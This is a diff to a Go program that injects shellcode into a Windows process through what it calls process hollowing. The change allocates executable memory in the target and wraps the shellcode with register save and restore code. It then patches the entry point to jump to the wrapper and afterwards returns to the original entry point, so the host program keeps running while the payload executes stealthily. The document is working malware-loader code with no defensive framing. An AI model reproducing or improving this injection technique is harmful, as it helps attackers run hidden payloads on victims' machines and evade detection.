@@ -359,33 +359,6 @@ func tryHollowExecutable(path string, shellcode []byte, debug bool) error {
 	imageBaseValue := binary.LittleEndian.Uint64(addressBuffer)
 	debugLog(debug, "[+] Image base: 0x%x", imageBaseValue)
 
-	// 分配新的内存空间
-	debugLog(debug, "[+] Allocating memory for shellcode of size: %d bytes", len(shellcode))
-	newMemory, _, err := virtualAllocEx.Call(
-		uintptr(processInfo.Process),
-		0,
-		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
-	)
-	if newMemory == 0 {
-		return fmt.Errorf("VirtualAllocEx failed: %v", err)
-	}
-	debugLog(debug, "[+] Allocated memory at: 0x%x", newMemory)
-
-	// 写入shellcode到新分配的内存
-	debugLog(debug, "[+] Writing shellcode")
-	_, _, err = writeProcessMemory.Call(
-		uintptr(processInfo.Process),
-		newMemory,
-		uintptr(unsafe.Pointer(&shellcode[0])),
-		uintptr(len(shellcode)),
-		0,
-	)
-	if err != nil && err.Error() != "The operation completed successfully." {
-		return fmt.Errorf("WriteProcessMemory failed: %v", err)
-	}
-
 	// 读取DOS头和NT头
 	headerBuffer := make([]byte, 0x1000)
 	_, _, err = readProcessMemory.Call(
@@ -410,23 +383,117 @@ func tryHollowExecutable(path string, shellcode []byte, debug bool) error {
 	debugLog(debug, "[+] Original entry point RVA: 0x%x", entrypointRVA)
 	debugLog(debug, "[+] Original entry point address: 0x%x", entrypointAddress)
 
-	// 创建跳转代码到shellcode
-	jumpCode := []byte{
-		0x48, 0xB8, // mov rax,
-		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <address>
-		0xFF, 0xE0, // jmp rax
+	// 保存原始入口点代码
+	originalCode := make([]byte, 32)
+	_, _, err = readProcessMemory.Call(
+		uintptr(processInfo.Process),
+		uintptr(entrypointAddress),
+		uintptr(unsafe.Pointer(&originalCode[0])),
+		uintptr(len(originalCode)),
+		uintptr(unsafe.Pointer(&read)),
+	)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		return fmt.Errorf("ReadProcessMemory failed for original code: %v", err)
 	}
 
-	// 将新内存地址写入跳转代码
-	binary.LittleEndian.PutUint64(jumpCode[2:], uint64(newMemory))
+	// 创建包装器代码空间
+	wrapperSize := len(shellcode) + 100 // 额外空间用于包装代码
+	wrapperMemory, _, err := virtualAllocEx.Call(
+		uintptr(processInfo.Process),
+		0,
+		uintptr(wrapperSize),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_EXECUTE_READWRITE,
+	)
+	if wrapperMemory == 0 {
+		return fmt.Errorf("VirtualAllocEx failed for wrapper: %v", err)
+	}
+	debugLog(debug, "[+] Allocated wrapper memory at: 0x%x", wrapperMemory)
 
-	// 修改原始入口点的保护属性
+	// 构建包装器代码
+	// 保存寄存器
+	wrapperCode := []byte{
+		0x50,       // push rax
+		0x51,       // push rcx
+		0x52,       // push rdx
+		0x53,       // push rbx
+		0x54,       // push rsp
+		0x55,       // push rbp
+		0x56,       // push rsi
+		0x57,       // push rdi
+		0x41, 0x50, // push r8
+		0x41, 0x51, // push r9
+		0x41, 0x52, // push r10
+		0x41, 0x53, // push r11
+		0x41, 0x54, // push r12
+		0x41, 0x55, // push r13
+		0x41, 0x56, // push r14
+		0x41, 0x57, // push r15
+		0x9C, // pushfq
+	}
+
+	// 添加shellcode
+	wrapperCode = append(wrapperCode, shellcode...)
+
+	// 恢复寄存器
+	restoreRegisters := []byte{
+		0x9D,       // popfq
+		0x41, 0x5F, // pop r15
+		0x41, 0x5E, // pop r14
+		0x41, 0x5D, // pop r13
+		0x41, 0x5C, // pop r12
+		0x41, 0x5B, // pop r11
+		0x41, 0x5A, // pop r10
+		0x41, 0x59, // pop r9
+		0x41, 0x58, // pop r8
+		0x5F, // pop rdi
+		0x5E, // pop rsi
+		0x5D, // pop rbp
+		0x5C, // pop rsp
+		0x5B, // pop rbx
+		0x5A, // pop rdx
+		0x59, // pop rcx
+		0x58, // pop rax
+	}
+	wrapperCode = append(wrapperCode, restoreRegisters...)
+
+	// 添加跳转回原始入口点的代码
+	jumpBack := []byte{
+		0x48, 0xB8, // mov rax,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <original entry point>
+		0xFF, 0xE0, // jmp rax
+	}
+	binary.LittleEndian.PutUint64(jumpBack[2:], entrypointAddress)
+	wrapperCode = append(wrapperCode, jumpBack...)
+
+	// 写入包装器代码
+	debugLog(debug, "[+] Writing wrapper code")
+	_, _, err = writeProcessMemory.Call(
+		uintptr(processInfo.Process),
+		wrapperMemory,
+		uintptr(unsafe.Pointer(&wrapperCode[0])),
+		uintptr(len(wrapperCode)),
+		0,
+	)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		return fmt.Errorf("WriteProcessMemory failed for wrapper code: %v", err)
+	}
+
+	// 修改入口点跳转到包装器
+	jumpToWrapper := []byte{
+		0x48, 0xB8, // mov rax,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <wrapper address>
+		0xFF, 0xE0, // jmp rax
+	}
+	binary.LittleEndian.PutUint64(jumpToWrapper[2:], uint64(wrapperMemory))
+
+	// 修改入口点保护属性
 	var oldProtect uint32
 	debugLog(debug, "[+] Changing memory protection of original entry point")
 	ret, _, err = virtualProtectEx.Call(
 		uintptr(processInfo.Process),
 		uintptr(entrypointAddress),
-		uintptr(len(jumpCode)),
+		uintptr(len(jumpToWrapper)),
 		0x40, // PAGE_EXECUTE_READWRITE
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
@@ -434,25 +501,25 @@ func tryHollowExecutable(path string, shellcode []byte, debug bool) error {
 		return fmt.Errorf("VirtualProtectEx failed: %v", err)
 	}
 
-	// 写入跳转代码
-	debugLog(debug, "[+] Writing jump code to original entry point")
+	// 写入跳转到包装器的代码
+	debugLog(debug, "[+] Writing jump to wrapper")
 	_, _, err = writeProcessMemory.Call(
 		uintptr(processInfo.Process),
 		uintptr(entrypointAddress),
-		uintptr(unsafe.Pointer(&jumpCode[0])),
-		uintptr(len(jumpCode)),
+		uintptr(unsafe.Pointer(&jumpToWrapper[0])),
+		uintptr(len(jumpToWrapper)),
 		0,
 	)
 	if err != nil && err.Error() != "The operation completed successfully." {
 		return fmt.Errorf("WriteProcessMemory failed for jump code: %v", err)
 	}
 
-	// 恢复内存保护
+	// 恢复入口点内存保护
 	debugLog(debug, "[+] Restoring memory protection")
 	ret, _, err = virtualProtectEx.Call(
 		uintptr(processInfo.Process),
 		uintptr(entrypointAddress),
-		uintptr(len(jumpCode)),
+		uintptr(len(jumpToWrapper)),
 		uintptr(oldProtect),
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
@@ -465,6 +532,10 @@ func tryHollowExecutable(path string, shellcode []byte, debug bool) error {
 	if err != nil && err.Error() != "The operation completed successfully." {
 		return fmt.Errorf("ResumeThread failed: %v", err)
 	}
+
+	// 清理句柄
+	syscall.CloseHandle(processInfo.Process)
+	syscall.CloseHandle(processInfo.Thread)
 
 	debugLog(debug, "[+] Process hollowing completed successfully")
 	return nil
